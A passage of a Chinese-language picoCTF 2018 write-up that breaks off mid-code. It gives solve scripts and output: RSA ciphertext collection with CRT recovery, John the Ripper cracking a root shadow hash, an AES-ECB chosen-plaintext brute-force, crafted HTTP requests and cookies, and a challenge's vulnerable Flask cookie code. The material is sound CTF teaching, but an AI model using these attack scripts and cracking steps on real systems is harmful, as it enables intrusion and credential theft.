+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># __author__ = findneo</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2,re</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> connect</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line">c=[]</span><br><span class="line">n=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'buf'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">        j=i.strip().split(<span class="string">' '</span>)</span><br><span class="line">        c.append(int(j[<span class="number">0</span>]))</span><br><span class="line">        n.append(int(j[<span class="number">1</span>]))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"mytag:"</span>,len(c)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'buf'</span>,<span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">while</span> len(c)&lt;<span class="number">65538</span>:</span><br><span class="line">        r=connect(<span class="string">'2018shell2.picoctf.com'</span>,<span class="number">24039</span>)</span><br><span class="line">        res=r.recv()</span><br><span class="line">        g=re.findall(<span class="string">'c: (\d+)\nn: (\d+)\n.*'</span>,res)[<span class="number">0</span>]</span><br><span class="line">        f.write(<span class="string">' '</span>.join(g)+<span class="string">'\n'</span>)</span><br><span class="line">        c.append(g[<span class="number">0</span>])</span><br><span class="line">        n.append(g[<span class="number">1</span>])</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="comment"># sleep(0.1)</span></span><br><span class="line">        <span class="keyword">if</span> len(c)%<span class="number">1000</span>==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'mytag:'</span>,len(c)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GCRT</span><span class="params">(mi, ai)</span>:</span></span><br><span class="line">    <span class="comment"># mi,ai分别表示模数和取模后的值,都为列表结构</span></span><br><span class="line">    <span class="keyword">assert</span> (isinstance(mi, list) <span class="keyword">and</span> isinstance(ai, list))</span><br><span class="line">    curm, cura = mi[<span class="number">0</span>], ai[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> (m, a) <span class="keyword">in</span> zip(mi[<span class="number">1</span>:], ai[<span class="number">1</span>:]):</span><br><span class="line">        d = gmpy2.gcd(curm, m)</span><br><span class="line">        c = a - cura</span><br><span class="line">        <span class="keyword">assert</span> (c % d == <span class="number">0</span>) <span class="comment">#不成立则不存在解</span></span><br><span class="line">        K = c / d * gmpy2.invert(curm / d, m / d)</span><br><span class="line">        cura += curm * K</span><br><span class="line">        curm = curm * m / d</span><br><span class="line">        cura %= curm</span><br><span class="line">    <span class="keyword">return</span> (cura % curm, curm) <span class="comment">#(解,最小公倍数)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> GCRT(n,c)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
+<h2 id="HEEEEEEERE’S-Johnny"><a href="#HEEEEEEERE’S-Johnny" class="headerlink" title="HEEEEEEERE’S Johnny!"></a>HEEEEEEERE’S Johnny!</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/wordlists/rockyou.txt.gz .</span><br><span class="line">gunzip rockyou.txt.gz</span><br><span class="line">unshadow passwd shadow &gt; unshadowes.txt</span><br><span class="line">john --wordlist=~/mywordlists/rockyou.txt --rules unshadowes.txt</span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">"sha512crypt"</span>, but the string is also recognized as <span class="string">"crypt"</span></span><br><span class="line">Use the <span class="string">"--format=crypt"</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (sha512crypt, crypt(3) <span class="variable">$6</span>$ [SHA512 128/128 AVX 2x])</span><br><span class="line">Press <span class="string">'q'</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">thematrix        (root)</span><br><span class="line">1g 0:00:00:16 DONE (2018-10-10 10:04) 0.06002g/s 660.7p/s 660.7c/s 660.7C/s kenya..saavedra</span><br><span class="line">Use the <span class="string">"--show"</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br><span class="line"></span><br><span class="line">nc 2018shell2.picoctf.com 38860</span><br><span class="line">Username: root</span><br><span class="line">Password: thematrix</span><br><span class="line">picoCTF&#123;J0hn_1<span class="variable">$_R1pp3d_4e5aa29e</span>&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="rsa-madlibs"><a href="#rsa-madlibs" class="headerlink" title="rsa-madlibs"></a>rsa-madlibs</h2><p>回答一些简单的RSA知识。可以参考<a href="https://findneo.github.io/180727rsa-attack/">CTF中常见的RSA相关问题总结</a> 一文。</p>
+<p>发现一个做这类题目的好方法，<code>python solve.py | nc 2018shell2.picoctf.com 18148</code> ，不到必要就不去处理各种奇怪的数据。</p>
+<p><code>picoCTF{d0_u_kn0w_th3_w@y_2_RS@_b38be18a}</code> </p>
+<h2 id="SpyFi"><a href="#SpyFi" class="headerlink" title="SpyFi"></a>SpyFi</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2 -u</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">agent_code = <span class="string">"""flag"""</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span><span class="params">(message)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(message) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">        message = message + <span class="string">'0'</span>*(<span class="number">16</span> - len(message)%<span class="number">16</span> )</span><br><span class="line">    <span class="keyword">return</span> message</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(key, plain)</span>:</span></span><br><span class="line">    cipher = AES.new( key.decode(<span class="string">'hex'</span>), AES.MODE_ECB )</span><br><span class="line">    <span class="keyword">return</span> cipher.encrypt(plain).encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">welcome = <span class="string">"Welcome, Agent 006!"</span></span><br><span class="line"><span class="keyword">print</span> welcome</span><br><span class="line"></span><br><span class="line">sitrep = raw_input(<span class="string">"Please enter your situation report: "</span>)</span><br><span class="line">message = <span class="string">"""Agent,</span></span><br><span class="line"><span class="string">Greetings. My situation report is as follows:</span></span><br><span class="line"><span class="string">&#123;0&#125;</span></span><br><span class="line"><span class="string">My agent identifying code is: &#123;1&#125;.</span></span><br><span class="line"><span class="string">Down with the Soviets,</span></span><br><span class="line"><span class="string">006</span></span><br><span class="line"><span class="string">"""</span>.format( sitrep, agent_code )</span><br><span class="line"></span><br><span class="line">message = pad(message)</span><br><span class="line"><span class="keyword">print</span> encrypt( <span class="string">"""key"""</span>, message )</span><br></pre></td></tr></table></figure>
+<p>AES的ECB模式存在选择明文攻击。</p>
+<p>当输入9个字节时，message中flag之外的部分长度为122个字节，密文长度为160个字节；当输入10个字节时，密文长度为176个字节。说明flag长度为160-122=38个字节。</p>
+<p><img src="1538925911862.png" alt="1538925911862"></p>
+<p>将message分组输出，看到爆破flag的机会。</p>
+<p><img src="1538929635797.png" alt="1538929635797"></p>
+<p>写完代码验证可行。</p>
+<p><img src="1538934008777.png" alt="1538934008777"></p>
+<p>最后成果：</p>
+<p><code>picoCTF{@g3nt6_1$_th3_c00l3$t_8124762}</code> </p>
+<p><img src="1538938179361.png" alt="1538938179361"></p>
+<p><img src="1538938605546.png" alt="1538938605546"></p>
+<p>全部代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">part_msg</span><span class="params">(message,part_length=<span class="number">16</span>)</span>:</span></span><br><span class="line">	sl=len(message)</span><br><span class="line">	pl=part_length </span><br><span class="line">	m=[message[pl*i:min(sl,pl*i+pl)] <span class="keyword">for</span> i <span class="keyword">in</span> range(sl/pl+(sl%pl&gt;<span class="number">0</span>))]</span><br><span class="line">	<span class="keyword">return</span> m</span><br><span class="line">msg=[<span class="string">'Agent,\nGreetings. My situation report is as follows:\n'</span>,<span class="string">'\nMy agent identifying code is: '</span>,<span class="string">'.\nDown with the Soviets,\n006\n'</span>,]</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> connect</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">()</span>:</span></span><br><span class="line">	cnt=<span class="number">0</span></span><br><span class="line">	flag=<span class="string">'picoCTF&#123;@'</span></span><br><span class="line">	<span class="comment"># sitrep,agent_code='',''</span></span><br><span class="line">	<span class="comment"># message =msg[0] +sitrep+msg[1]+agent_code+msg[2]</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">38</span>-len(flag)):</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> string.printable:</span><br><span class="line">			<span class="comment"># print "flag:",i</span></span><br><span class="line">			r=connect(<span class="string">"2018shell2.picoctf.com"</span>,<span class="number">37131</span>)</span><br><span class="line">			cnt+=<span class="number">1</span>;time.sleep(<span class="number">1</span>)</span><br><span class="line">			prompt=r.recvuntil(<span class="string">"report: "</span>)</span><br><span class="line">			<span class="comment"># 113 + (11+16+38+10)  + 38 = 226</span></span><br><span class="line">			base=<span class="string">'fying code is: '</span>+flag</span><br><span class="line">			sitrep=<span class="string">'@'</span>*<span class="number">11</span>+base[<span class="number">-15</span>:]+i+<span class="string">'@'</span>*(<span class="number">38</span>-len(flag)+<span class="number">10</span>)</span><br><span class="line">			<span class="comment"># agent_code="#"*38</span></span><br><span class="line">			<span class="comment"># message =msg[0] +sitrep+msg[1]+agent_code+msg[2]</span></span><br><span class="line">			<span class="comment"># print '\n'.join(map(repr,part_msg(message)))</span></span><br><span class="line">			r.sendline(sitrep)</span><br><span class="line">			response=r.recv()</span><br><span class="line">			<span class="comment"># print len(response)</span></span><br><span class="line">			tmp=part_msg(response,<span class="number">32</span>)</span><br><span class="line">			<span class="comment"># print len(tmp)</span></span><br><span class="line">			<span class="comment"># print '\n'.join(tmp)</span></span><br><span class="line">			r.close()</span><br><span class="line">			<span class="comment"># print len(msg[0]+sitrep+msg[1]+flag)/16</span></span><br><span class="line">			<span class="keyword">if</span> tmp[<span class="number">4</span>]==tmp[len(msg[<span class="number">0</span>]+sitrep+msg[<span class="number">1</span>]+flag)/<span class="number">16</span>]:</span><br><span class="line">				flag+=i</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">"flag:"</span>,flag,cnt</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"flag:"</span>,time.asctime()</span><br><span class="line">solve()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"flag:"</span>,time.asctime()</span><br></pre></td></tr></table></figure>
+<h1 id="Web-Exploitation"><a href="#Web-Exploitation" class="headerlink" title="Web Exploitation"></a>Web Exploitation</h1><h2 id="Buttons"><a href="#Buttons" class="headerlink" title="Buttons"></a>Buttons</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://2018shell2.picoctf.com:65107/button2.php --data <span class="string">"123"</span></span><br><span class="line">Well <span class="keyword">done</span>, your flag is: picoCTF&#123;button_button_whose_got_the_button_91f6f39a&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Artisinal-Handcrafted-HTTP-3"><a href="#Artisinal-Handcrafted-HTTP-3" class="headerlink" title="Artisinal Handcrafted HTTP 3"></a>Artisinal Handcrafted HTTP 3</h2><p>先请求一下login页面：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/login</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: flag.local</span><br></pre></td></tr></table></figure>
+<p>发现表单是这样的：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">x-powered-by: Express</span><br><span class="line">content-type: text/html; charset=utf<span class="number">-8</span></span><br><span class="line">content-length: <span class="number">498</span></span><br><span class="line">etag: W/<span class="string">"1f2-UE5AGAqbLVQn1qrfKFRIqanxl9I"</span></span><br><span class="line">date: Sun, <span class="number">07</span> Oct <span class="number">2018</span> <span class="number">18</span>:<span class="number">33</span>:<span class="number">21</span> GMT</span><br><span class="line">connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		&lt;html&gt;</span><br><span class="line">			&lt;head&gt;</span><br><span class="line">				&lt;link rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"main.css"</span> /&gt;</span><br><span class="line">			&lt;/head&gt;</span><br><span class="line">			&lt;body&gt;</span><br><span class="line">				&lt;header&gt;</span><br><span class="line">					&lt;h1&gt;Real Business Internal Flag Server&lt;/h1&gt;</span><br><span class="line">					&lt;a href=<span class="string">"/login"</span>&gt;Login&lt;/a&gt;</span><br><span class="line">				&lt;/header&gt;</span><br><span class="line">				&lt;main&gt;</span><br><span class="line">					&lt;h2&gt;Log In&lt;/h2&gt;</span><br><span class="line">					</span><br><span class="line">					&lt;form method=<span class="string">"POST"</span> action=<span class="string">"login"</span>&gt;</span><br><span class="line">						&lt;input type=<span class="string">"text"</span> name=<span class="string">"user"</span> placeholder=<span class="string">"Username"</span> /&gt;</span><br><span class="line">						&lt;input type=<span class="string">"password"</span> name=<span class="string">"pass"</span> placeholder=<span class="string">"Password"</span> /&gt;</span><br><span class="line">						&lt;input type=<span class="string">"submit"</span> /&gt;</span><br><span class="line">					&lt;/form&gt;</span><br><span class="line">				&lt;/main&gt;</span><br><span class="line">			&lt;/body&gt;</span><br><span class="line">		&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>再请求登陆：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/login</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: flag.local</span><br><span class="line"><span class="attribute">Content-Length</span>: 38</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">user=realbusinessuser&amp;pass=potoooooooo</span><br></pre></td></tr></table></figure>
+<p>响应：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">302</span> Found</span><br><span class="line"><span class="attribute">x-powered-by</span>: Express</span><br><span class="line"><span class="attribute">set-cookie</span>: real_business_token=PHNjcmlwdD5hbGVydCgid2F0Iik8L3NjcmlwdD4%3D; Path=/</span><br><span class="line"><span class="attribute">location</span>: /</span><br><span class="line"><span class="attribute">vary</span>: Accept</span><br><span class="line"><span class="attribute">content-type</span>: text/plain; charset=utf-8</span><br><span class="line"><span class="attribute">content-length</span>: 23</span><br><span class="line"><span class="attribute">date</span>: Tue, 09 Oct 2018 15:11:46 GMT</span><br><span class="line"><span class="attribute">connection</span>: close</span><br><span class="line"></span><br><span class="line">Found. Redirecting to /</span><br></pre></td></tr></table></figure>
+<p>带上cookie请求：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: flag.local</span><br><span class="line"><span class="attribute">cookie</span>: real_business_token=PHNjcmlwdD5hbGVydCgid2F0Iik8L3NjcmlwdD4%3D; Path=/</span><br></pre></td></tr></table></figure>
+<p>响应：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">x-powered-by</span>: Express</span><br><span class="line"><span class="attribute">content-type</span>: text/html; charset=utf-8</span><br><span class="line"><span class="attribute">content-length</span>: 438</span><br><span class="line"><span class="attribute">etag</span>: W/"1b6-eYJ8DUTdkgByyfWFi6OJJSjopFg"</span><br><span class="line"><span class="attribute">date</span>: Tue, 09 Oct 2018 15:12:57 GMT</span><br><span class="line"><span class="attribute">connection</span>: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;link rel="stylesheet" type="text/css" href="main.css" /&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;header&gt;</span><br><span class="line">            &lt;h1&gt;Real Business Internal Flag Server&lt;/h1&gt;</span><br><span class="line">            &lt;div class="user"&gt;Real Business Employee&lt;/div&gt;</span><br><span class="line">            &lt;a href="/logout"&gt;Logout&lt;/a&gt;</span><br><span class="line">        &lt;/header&gt;</span><br><span class="line">        &lt;main&gt;</span><br><span class="line">            &lt;p&gt;Hello &lt;b&gt;Real Business Employee&lt;/b&gt;!  Today's flag is: &lt;code&gt;picoCTF&#123;0nLY_Us3_n0N_GmO_xF3r_pR0tOcol5_2e14&#125;&lt;/code&gt;.&lt;/p&gt;</span><br><span class="line">        &lt;/main&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="【X】Secure-Logon"><a href="#【X】Secure-Logon" class="headerlink" title="【X】Secure Logon"></a>【X】Secure Logon</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, url_for, redirect, make_response, flash</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">'seed removed'</span></span><br><span class="line">flag_value = <span class="string">'flag removed'</span></span><br><span class="line"></span><br><span class="line">BLOCK_SIZE = <span class="number">16</span>  <span class="comment"># Bytes</span></span><br><span class="line">pad = <span class="keyword">lambda</span> s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \</span><br><span class="line">                chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)</span><br><span class="line">unpad = <span class="keyword">lambda</span> s: s[:-ord(s[len(s) - <span class="number">1</span>:])]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.form[<span class="string">'user'</span>] == <span class="string">'admin'</span>:</span><br><span class="line">        message = <span class="string">"I'm sorry the admin password is super secure. You're not getting in that way."</span></span><br><span class="line">        category = <span class="string">'danger'</span></span><br><span class="line">        flash(message, category)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line">    resp = make_response(redirect(<span class="string">"/flag"</span>))</span><br><span class="line"></span><br><span class="line">    cookie = &#123;&#125;</span><br><span class="line">    cookie[<span class="string">'password'</span>] = request.form[<span class="string">'password'</span>]</span><br><span class="line">    cookie[<span class="string">'username'</span>] = request.form[<span class="string">'user'</span>]</span><br><span class="line">    cookie[<span class="string">'admin'</span>] = <span class="number">0</span></span><br><span class="line">    print(cookie)</span><br><span class="line">    cookie_data = json.dumps(cookie, sort_keys=<span class="keyword">True</span>)</span><br><span class="line">    encrypted = AESCipher(app.secret_key).encrypt(cookie_data)</span><br><span class="line">    print(encrypted)</span><br><span class="line">    resp.set_cookie(<span class="string">'cookie'</span>, encrypted)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/logout')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    resp = make_response(redirect(<span class="string">"/"</span>))</span><br><span class="line">    resp.set_cookie(<span class="string">'cookie'</span>, <span class="string">''</span>, expires=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/flag', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span><span class="params">()</span>:</span></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">      encrypted = request.cookies[<span class="string">'cookie'</span>]</span><br><span class="line">  <span class="keyword">except</span> KeyError:</span><br><span class="line">      flash(<span class="string">"Error: Please log-in again."</span>)</span><br><span class="line">      <span class="keyword">return</span> redirect(url_for(<span class="string">'main'</span>))</span><br><span class="line">  data = AESCipher(app.secret_key).decrypt(encrypted)</span><br><span class="line">  data = json.loads(data)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">     check = data[<span class="string">'admin'</span>]</span><br><span class="line">  <span class="keyword">except</span> KeyError:</span><br><span class="line">     check = <span class="number">0</span></span><br><span class="line">  <span class="keyword">if</span> check == <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">return</span> render_template(<span class="string">'flag.html'</span>, value=flag_value)</span><br><span class="line">  flash(<span class="string">"Success: You logged in! Not sure you'll be able to see the flag though."</span>, <span class="string">"success"</span>)</span><br><span class="line">  <span class="keyword">return</span> render_template(<span class="string">'not-flag.html'</span>, cookie=data)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AESCipher</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Usage:</span></span><br><span class="line"><span class="string">        c = AESCipher('password').encrypt('message')</span></span><br><span class="line"><span class="string">        m = AESCipher('password').decrypt(c)</span></span><br><span class="line"><span class="string">    Tested under Python 3 and PyCrypto 2.6.1.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, key)</span>:</span></span><br><span class="line">        self.key = 